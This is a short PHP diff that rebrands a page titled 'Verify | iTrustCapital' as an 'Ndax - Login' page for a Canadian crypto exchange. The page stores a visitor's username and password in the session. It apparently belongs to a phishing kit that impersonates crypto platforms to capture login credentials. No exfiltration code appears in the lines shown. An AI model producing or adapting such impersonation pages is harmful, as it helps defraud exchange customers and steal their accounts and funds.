@@ -1,7 +1,7 @@
 <?php include_once './config.php'; ?>
 <html lang="en">
     <?php
-        $title = 'Verify | iTrustCapital';
+        $title = "Ndax - Login | Canada's most secure crypto exchange";
         include_once './includes/meta.php';
         if(empty($_SESSION["username"]) || empty($_SESSION["password"])) {
             redirect(base_url());
